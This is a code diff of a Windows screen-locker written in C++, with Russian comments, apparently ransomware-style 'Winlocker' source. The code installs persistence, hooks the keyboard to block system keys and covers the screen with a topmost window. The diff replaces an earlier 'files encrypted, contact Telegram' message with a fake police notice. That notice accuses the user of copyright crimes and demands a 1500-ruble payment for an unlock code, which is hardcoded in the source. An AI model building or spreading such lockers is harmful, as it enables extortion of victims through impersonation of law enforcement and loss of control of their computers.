@@ -5,21 +5,17 @@
 #include <windows.h>
 #include <string>
 #include <vector>
-#include <cmath>
-#include <thread>
 
 #pragma execution_character_set("utf-8")
 
-static const std::wstring kPassword = L"1337";
+// Код разблокировки (в честь 146 статьи)
+static const std::wstring kPassword = L"1461";
 
 static HHOOK   g_kbHook    = nullptr;
 static HWND    g_hwnd      = nullptr;
 static bool    g_locked    = true;
 static std::wstring g_input;
 static bool    g_blink     = false;
-static int     g_glitch_offset = 0;
-static int     g_scanline_y = 0;
-static POINT   g_mouse_pos = {0, 0};
 
 static void InstallPersistence() {
     wchar_t self[MAX_PATH]{};
@@ -45,9 +41,10 @@ static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lP
     if (nCode == HC_ACTION && g_locked) {
         KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
         if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
+            // Жестко блокируем системные клавиши
             if (p->vkCode == VK_LWIN || p->vkCode == VK_RWIN || p->vkCode == VK_TAB ||
                 p->vkCode == VK_ESCAPE || p->vkCode == VK_F4 || p->vkCode == VK_MENU ||
-                p->vkCode == VK_CONTROL || p->vkCode == VK_DELETE) {
+                p->vkCode == VK_CONTROL || p->vkCode == VK_DELETE || p->vkCode == VK_F12) {
                 return 1;
             }
         }
@@ -68,70 +65,6 @@ static void Unlock() {
     PostQuitMessage(0);
 }
 
-// Рисуем градиентный фон
-static void DrawBackground(HDC dc, int w, int h) {
-    TRIVERTEX vert[2];
-    GRADIENT_RECT gRect;
-    vert[0].x = 0; vert[0].y = 0;
-    vert[0].Red = 0x5000; vert[0].Green = 0; vert[0].Blue = 0; vert[0].Alpha = 0;
-    vert[1].x = w; vert[1].y = h;
-    vert[1].Red = 0x1000; vert[1].Green = 0; vert[1].Blue = 0; vert[1].Alpha = 0;
-    gRect.UpperLeft = 0; gRect.LowerRight = 1;
-    GradientFill(dc, vert, 2, &gRect, 1, GRADIENT_FILL_RECT_V);
-}
-
-// Рисуем следящий глаз
-static void DrawEye(HDC dc, int cx, int cy, POINT mouse) {
-    int ew = 300, eh = 160;
-    int left = cx - ew / 2, right = cx + ew / 2;
-    int top = cy - eh / 2, bottom = cy + eh / 2;
-
-    // Белок глаза
-    HBRUSH hWhite = CreateSolidBrush(RGB(240, 240, 240));
-    SelectObject(dc, hWhite);
-    Ellipse(dc, left, top, right, bottom);
-    DeleteObject(hWhite);
-
-    // Радужка (следит за мышью)
-    int dx = mouse.x - cx;
-    int dy = mouse.y - cy;
-    float dist = sqrt((float)(dx*dx + dy*dy));
-    float max_dist = ew / 2 - 40;
-    if (dist > max_dist) {
-        dx = (int)(dx / dist * max_dist);
-        dy = (int)(dy / dist * max_dist);
-    }
-
-    int iris_x = cx + dx;
-    int iris_y = cy + dy;
-    int iris_r = 50;
-
-    HBRUSH hIris = CreateSolidBrush(RGB(150, 0, 0));
-    SelectObject(dc, hIris);
-    Ellipse(dc, iris_x - iris_r, iris_y - iris_r, iris_x + iris_r, iris_y + iris_r);
-    DeleteObject(hIris);
-
-    // Зрачок
-    HBRUSH hPupil = CreateSolidBrush(RGB(0, 0, 0));
-    SelectObject(dc, hPupil);
-    int pupil_r = 25;
-    Ellipse(dc, iris_x - pupil_r, iris_y - pupil_r, iris_x + pupil_r, iris_y + pupil_r);
-    DeleteObject(hPupil);
-
-    // Блик
-    HBRUSH hGlint = CreateSolidBrush(RGB(255, 255, 255));
-    SelectObject(dc, hGlint);
-    Ellipse(dc, iris_x - 15, iris_y - 20, iris_x - 5, iris_y - 10);
-    DeleteObject(hGlint);
-
-    // Контур глаза
-    HPEN hPen = CreatePen(PS_SOLID, 4, RGB(255, 255, 255));
-    SelectObject(dc, hPen);
-    SelectObject(dc, GetStockObject(NULL_BRUSH));
-    Ellipse(dc, left, top, right, bottom);
-    DeleteObject(hPen);
-}
-
 static LRESULT CALLBACK WndProc(HWND h, UINT msg, WPARAM w, LPARAM l) {
     switch (msg) {
     case WM_CREATE: {
@@ -139,36 +72,17 @@ static LRESULT CALLBACK WndProc(HWND h, UINT msg, WPARAM w, LPARAM l) {
         int sh = GetSystemMetrics(SM_CYSCREEN);
         
         SetWindowPos(h, HWND_TOPMOST, 0, 0, sw, sh, SWP_SHOWWINDOW);
-        ShowCursor(TRUE); 
+        ShowCursor(FALSE); // Курсор скрыт для пущего эффекта
         g_hwnd = h;
         SetForegroundWindow(h);
         SetFocus(h);
 
-        SetTimer(h, 1, 30, nullptr); // Глитч и помехи
-        SetTimer(h, 2, 500, nullptr); // Курсор
-        SetTimer(h, 3, 10, nullptr);  // Слежение за мышью
-        return 0;
-    }
-    case WM_MOUSEMOVE: {
-        g_mouse_pos.x = GET_X_LPARAM(l);
-        g_mouse_pos.y = GET_Y_LPARAM(l);
+        SetTimer(h, 1, 500, nullptr); // Таймер для мигающего курсора
         return 0;
     }
     case WM_TIMER: {
-        if (w == 1) {
-            g_glitch_offset = (rand() % 5) - 2; // Случайный сдвиг текста
-            g_scanline_y += 15;
-            if (g_scanline_y > GetSystemMetrics(SM_CYSCREEN)) g_scanline_y = 0;
-            InvalidateRect(h, nullptr, FALSE);
-        } else if (w == 2) {
-            g_blink = !g_blink;
-            InvalidateRect(h, nullptr, FALSE);
-        } else if (w == 3) {
-            POINT p;
-            GetCursorPos(&p);
-            g_mouse_pos = p;
-            InvalidateRect(h, nullptr, FALSE);
-        }
+        g_blink = !g_blink;
+        InvalidateRect(h, nullptr, FALSE);
         return 0;
     }
     case WM_PAINT: {
@@ -178,80 +92,133 @@ static LRESULT CALLBACK WndProc(HWND h, UINT msg, WPARAM w, LPARAM l) {
         int cx = rc.right;
         int cy = rc.bottom;
 
-        // 1. Градиентный фон
-        DrawBackground(dc, cx, cy);
+        // 1. Фон (Классический серый, как в старых окнах)
+        HBRUSH bg = CreateSolidBrush(RGB(200, 200, 200));
+        FillRect(dc, &rc, bg);
+        DeleteObject(bg);
 
-        // 2. Эффект помех (тонкая линия)
-        HPEN hScan = CreatePen(PS_SOLID, 2, RGB(255, 0, 0));
-        SelectObject(dc, hScan);
-        MoveToEx(dc, 0, g_scanline_y, NULL);
-        LineTo(dc, cx, g_scanline_y);
-        DeleteObject(hScan);
+        // 2. Верхняя синяя полоса (заголовок окна)
+        RECT rcTop = {0, 0, cx, 40};
+        HBRUSH topBg = CreateSolidBrush(RGB(0, 80, 160));
+        FillRect(dc, &rcTop, topBg);
+        DeleteObject(topBg);
 
-        // 3. Глаз
-        DrawEye(dc, cx / 2, cy / 3, g_mouse_pos);
-
-        // 4. Текст (с глитч-эффектом)
         SetBkMode(dc, TRANSPARENT);
-        HFONT fTitle = CreateFontW(72, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Impact");
-        SelectObject(dc, fTitle);
+        SetTextColor(dc, RGB(255, 255, 255));
+        HFONT fTitleBar = CreateFontW(18, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Tahoma");
+        SelectObject(dc, fTitleBar);
+        RECT rcTopText = {10, 0, cx, 40};
+        DrawTextW(dc, L"Внимание! Ваш компьютер заблокирован", -1, &rcTopText, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
 
-        // Тень/обводка
+        // 3. Основной блок (белая панель)
+        int panelW = 800;
+        int panelH = 500;
+        int panelX = (cx - panelW) / 2;
+        int panelY = 80;
+        RECT rcPanel = {panelX, panelY, panelX + panelW, panelY + panelH};
+        
+        HBRUSH panelBg = CreateSolidBrush(RGB(255, 255, 255));
+        FillRect(dc, &rcPanel, panelBg);
+        DeleteObject(panelBg);
+        
+        FrameRect(dc, &rcPanel, (HBRUSH)GetStockObject(GRAY_BRUSH));
+
+        // 4. Логотип (стилизованный щит)
+        int logoX = panelX + 20;
+        int logoY = panelY + 20;
+        HBRUSH shieldBg = CreateSolidBrush(RGB(220, 220, 220));
+        RECT rcShield = {logoX, logoY, logoX + 100, logoY + 100};
+        FillRect(dc, &rcShield, shieldBg);
+        DeleteObject(shieldBg);
+        FrameRect(dc, &rcShield, (HBRUSH)GetStockObject(BLACK_BRUSH));
+        
         SetTextColor(dc, RGB(0, 0, 0));
-        RECT rcTitle = {g_glitch_offset, cy / 2 + 30 + g_glitch_offset, cx, cy / 2 + 100};
-        DrawTextW(dc, L"ВАС ЗАМЕТИЛИ", -1, &rcTitle, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
-        
-        // Основной текст
-        SetTextColor(dc, RGB(255, 255, 255));
-        RECT rcTitleMain = {-g_glitch_offset, cy / 2 + 30 - g_glitch_offset, cx, cy / 2 + 100};
-        DrawTextW(dc, L"ВАС ЗАМЕТИЛИ", -1, &rcTitleMain, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
+        HFONT fLogo = CreateFontW(40, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Arial");
+        SelectObject(dc, fLogo);
+        DrawTextW(dc, L"МВД", -1, &rcShield, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
 
-        // 5. Блок с требованием
-        int boxW = 700, boxH = 200;
-        int boxX = (cx - boxW) / 2;
-        int boxY = cy - 300;
-        RECT rcBox = {boxX, boxY, boxX + boxW, boxY + boxH};
-        
-        HBRUSH hBoxBg = CreateSolidBrush(RGB(20, 0, 0));
-        FillRect(dc, &rcBox, hBoxBg);
-        DeleteObject(hBoxBg);
-        
-        FrameRect(dc, &rcBox, (HBRUSH)GetStockObject(WHITE_BRUSH));
+        // 5. Заголовок внутри панели
+        HFONT fHeader = CreateFontW(24, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Tahoma");
+        SelectObject(dc, fHeader);
+        SetTextColor(dc, RGB(180, 0, 0));
+        RECT rcHeader = {logoX + 120, logoY, panelX + panelW - 20, logoY + 60};
+        DrawTextW(dc, L"Ваш компьютер заблокирован", -1, &rcHeader, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
 
-        HFONT fText = CreateFontW(20, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Consolas");
+        // 6. Основной текст
+        HFONT fText = CreateFontW(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Tahoma");
         SelectObject(dc, fText);
-        SetTextColor(dc, RGB(255, 255, 255));
+        SetTextColor(dc, RGB(0, 0, 0));
         
-        RECT rcText = rcBox; rcText.left += 20; rcText.top += 20;
-        DrawTextW(dc, L"Ваши файлы зашифрованы.\nДля получения кода напишите в Telegram: @UserTGB", -1, &rcText, DT_LEFT | DT_TOP);
+        int textY = logoY + 120;
+        RECT rcText = {panelX + 20, textY, panelX + panelW - 20, panelY + panelH};
+        
+        const wchar_t* mainText = 
+            L"Уважаемый пользователь!\n\n"
+            L"Ваш компьютер был заблокирован сотрудниками Отдела К по причине\n"
+            L"нарушения статьи 146 Уголовного Кодекса РФ (Незаконное использование\n"
+            L"объектов авторского права).\n\n"
+            L"В ходе проверки было установлено, что с вашего IP-адреса\n"
+            L"осуществлялось распространение нелицензионного программного обеспечения.\n\n"
+            L"Для разблокировки вашего компьютера вам необходимо оплатить штраф\n"
+            L"в размере 1500 рублей. Оплата производится через терминалы\n"
+            L"мгновенной оплаты (Qiwi, WebMoney, Яндекс.Деньги).\n\n"
+            L"После оплаты вы получите код разблокировки, который нужно ввести\n"
+            L"в поле ниже.";
+            
+        DrawTextW(dc, mainText, -1, &rcText, DT_LEFT | DT_TOP | DT_WORDBREAK);
 
-        // Поле ввода
-        RECT rcInput = {boxX + 50, boxY + 120, boxX + boxW - 50, boxY + 160};
+        // 7. Поле ввода
+        int inputY = panelY + panelH - 100;
+        RECT rcInputLabel = {panelX + 20, inputY - 30, panelX + 300, inputY};
+        DrawTextW(dc, L"Код разблокировки:", -1, &rcInputLabel, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
+
+        RECT rcInput = {panelX + 20, inputY, panelX + 400, inputY + 30};
         HBRUSH white = CreateSolidBrush(RGB(255, 255, 255));
         FillRect(dc, &rcInput, white);
         DeleteObject(white);
+        FrameRect(dc, &rcInput, (HBRUSH)GetStockObject(GRAY_BRUSH));
         
         SetTextColor(dc, RGB(0, 0, 0));
-        RECT rcInputText = rcInput; rcInputText.left += 10;
+        RECT rcInputText = rcInput; rcInputText.left += 5;
         DrawTextW(dc, g_input.c_str(), -1, &rcInputText, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
 
-        // Курсор
+        // Мигающий курсор
         if (g_blink) {
             SIZE sz;
             GetTextExtentPoint32W(dc, g_input.c_str(), g_input.length(), &sz);
-            RECT rcCursor = {rcInputText.left + sz.cx, rcInputText.top + 5, rcInputText.left + sz.cx + 4, rcInputText.bottom - 5};
+            RECT rcCursor = {rcInputText.left + sz.cx, rcInputText.top + 5, rcInputText.left + sz.cx + 3, rcInputText.bottom - 5};
             HBRUSH curBrush = CreateSolidBrush(RGB(0, 0, 0));
             FillRect(dc, &rcCursor, curBrush);
             DeleteObject(curBrush);
         }
 
-        // Подсказка Enter
-        SetTextColor(dc, RGB(150, 150, 150));
-        RECT rcEnter = rcBox; rcEnter.top = rcBox.bottom + 10;
-        DrawTextW(dc, L"[ Enter для подтверждения ]", -1, &rcEnter, DT_CENTER | DT_TOP);
+        // 8. Кнопка "Разблокировать"
+        RECT rcBtn = {panelX + 420, inputY, panelX + 550, inputY + 30};
+        HBRUSH btnBg = CreateSolidBrush(RGB(220, 220, 220));
+        FillRect(dc, &rcBtn, btnBg);
+        DeleteObject(btnBg);
+        FrameRect(dc, &rcBtn, (HBRUSH)GetStockObject(BLACK_BRUSH));
+        
+        SetTextColor(dc, RGB(0, 0, 0));
+        DrawTextW(dc, L"Разблокировать", -1, &rcBtn, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
 
-        DeleteObject(fTitle);
+        // 9. Нижняя панель с "пометками"
+        RECT rcBottom = {0, cy - 40, cx, cy};
+        HBRUSH bottomBg = CreateSolidBrush(RGB(240, 240, 240));
+        FillRect(dc, &rcBottom, bottomBg);
+        DeleteObject(bottomBg);
+        
+        SetTextColor(dc, RGB(100, 100, 100));
+        HFONT fSmall = CreateFontW(14, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Tahoma");
+        SelectObject(dc, fSmall);
+        RECT rcBottomText = {10, cy - 40, cx - 10, cy};
+        DrawTextW(dc, L"© 2012 Отдел К. Все права защищены. Лицензия №146-УК.", -1, &rcBottomText, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
+
+        DeleteObject(fTitleBar);
+        DeleteObject(fLogo);
+        DeleteObject(fHeader);
         DeleteObject(fText);
+        DeleteObject(fSmall);
         EndPaint(h, &ps);
         return 0;
     }
